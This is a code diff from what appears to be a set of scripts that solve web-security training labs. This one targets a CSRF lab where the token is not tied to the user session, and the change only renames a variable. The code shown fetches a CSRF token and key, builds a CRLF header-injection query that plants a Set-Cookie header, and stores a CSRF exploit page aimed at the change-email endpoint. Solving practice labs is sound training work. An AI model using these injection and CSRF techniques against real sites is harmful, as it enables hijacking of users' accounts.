@@ -4,14 +4,14 @@ import { getParsedInput } from "../../../utils/getParsedInput.js";
 import { runTasks } from "../../../utils/runTasks.js";
 import { createExploit } from "../utils/createExploit.js";
 
-const { url, httpClient } = getParsedInput({
+const { labUrl, httpClient } = getParsedInput({
   description: "Lab: CSRF where token is not tied to user session",
   proxy: true,
 });
 
 async function task() {
   const exploit = await getExploit();
-  const exploitServer = await ExploitServer.create(url, httpClient);
+  const exploitServer = await ExploitServer.create(labUrl, httpClient);
   await exploitServer.storeExploit(exploit);
 
   console.log(`To solve the lab:
@@ -23,11 +23,11 @@ runTasks([task]);
 
 async function getExploit() {
   const exploitFilePath = new URL("./exploit.html", import.meta.url);
-  const response = await httpClient.get(url + "login");
+  const response = await httpClient.get(labUrl + "login");
   const csrfToken = extractCsrfToken(response.data);
   const csrfKey = extractCsrfKey(response);
   const cookieExploitUrl = getCookieExploitUrl(csrfKey);
-  const actionUrl = url + "my-account/change-email";
+  const actionUrl = labUrl + "my-account/change-email";
   let exploit = await createExploit(exploitFilePath, { actionUrl, csrfToken });
   exploit = setCookieExploitUrl(exploit, cookieExploitUrl);
   return exploit;
@@ -61,7 +61,7 @@ function getCookieExploitUrl(csrfKey) {
   const cookieExploit = encodeURI(
     `?search=\r\nSet-Cookie:csrfKey=${csrfKey};SameSite=None;Secure`,
   );
-  return url + cookieExploit;
+  return labUrl + cookieExploit;
 }
 
 function setCookieExploitUrl(exploit, cookieExploitUrl) {
